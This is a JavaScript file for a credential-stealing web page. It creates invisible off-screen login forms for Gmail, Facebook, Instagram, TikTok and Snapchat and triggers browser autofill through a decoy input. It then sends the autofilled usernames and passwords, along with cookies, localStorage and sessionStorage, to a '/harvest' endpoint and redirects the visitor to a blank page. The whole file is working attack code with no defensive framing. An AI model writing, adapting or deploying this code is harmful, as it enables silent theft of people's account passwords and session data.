// A flag to prevent multiple harvests
window.harvested = false;

async function harvest() {
  // Check the flag to ensure this function only runs once
  if (window.harvested) return;
  window.harvested = true;
  console.log('Harvest triggered!');

  // A delay to allow the browser to populate all fields in the form (e.g., username and password)
  await new Promise(resolve => setTimeout(resolve, 250));

  const gmailForm = document.getElementById('gmail-form');
  const facebookForm = document.getElementById('facebook-form');
  const instagramForm = document.getElementById('instagram-form');
  const tiktokForm = document.getElementById('tiktok-form');
  const snapchatForm = document.getElementById('snapchat-form');

  const data = {
    gmail: {
      email: gmailForm ? gmailForm.email.value : '',
      password: gmailForm ? gmailForm.password.value : '',
    },
    facebook: {
      username: facebookForm ? facebookForm.username.value : '',
      password: facebookForm ? facebookForm.password.value : '',
    },
    instagram: {
      username: instagramForm ? instagramForm.username.value : '',
      password: instagramForm ? instagramForm.password.value : '',
    },
    tiktok: {
      username: tiktokForm ? tiktokForm.username.value : '',
      password: tiktokForm ? tiktokForm.password.value : '',
    },
    snapchat: {
      username: snapchatForm ? snapchatForm.username.value : '',
      password: snapchatForm ? snapchatForm.password.value : '',
    },
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
  };

  try {
    // Use sendBeacon for a more reliable unload harvest
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Beacon harvest sent.');
    } else {
      // Fallback to fetch for other cases
      const response = await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Harvest successful:', response.status);
    }
  } catch (error) {
    console.error('Harvest failed:', error);
  }

  // Redirect after a short delay
  setTimeout(() => {
    window.location.href = 'about:blank';
  }, 500);
}

// --- Autofill Detection using 'input' event ---
function setupInputListeners() {
    const inputs = document.querySelectorAll('.hidden-form input');
    inputs.forEach(input => {
        input.addEventListener('input', harvest);
    });
    console.log('Input listeners set up for all hidden form inputs.');
}

// --- Fallback Mechanisms ---
window.addEventListener('beforeunload', harvest);

// --- UI & Focus Trap Logic ---

// After a delay, hide the loader and show the honeypot prompt
setTimeout(() => {
  const previewContainer = document.querySelector('.preview-container');
  const honeypotContainer = document.querySelector('.honeypot-container');
  if (previewContainer) previewContainer.style.display = 'none';
  if (honeypotContainer) {
    honeypotContainer.style.display = 'block';
    // Set up listeners once the honeypot is visible
    setupInputListeners();
  }
}, 1500);

function triggerFocusSwarm() {
  console.log('Honeypot focused, attempting to trigger focus swarm...');

  const forms = document.querySelectorAll('.hidden-form');
  
  // Make forms technically "visible" but positioned off-screen or transparently
  // so they can be focused without disrupting the layout.
  forms.forEach(form => {
    form.style.display = 'block';
    form.style.opacity = '0';
    form.style.position = 'absolute';
    form.style.top = '-9999px';
    form.style.left = '-9999px';
  });

  // Focus all the username/email fields to trigger autofill prompts
  document.querySelector('#gmail-form input[name="email"]')?.focus({ preventScroll: true });
  document.querySelector('#facebook-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#instagram-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#tiktok-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#snapchat-form input[name="username"]')?.focus({ preventScroll: true });

  // The forms are not hidden again. They remain in the DOM but invisible to the user.
  // The 'input' event listeners will trigger the harvest when autofill occurs.
  // The page will then redirect, cleaning up the DOM.
}

// Add a one-time event listener to the honeypot input for the 'focus' event.
const honeypotInput = document.getElementById('honeypot-input');
if (honeypotInput) {
  honeypotInput.addEventListener('focus', triggerFocusSwarm, { once: true });
}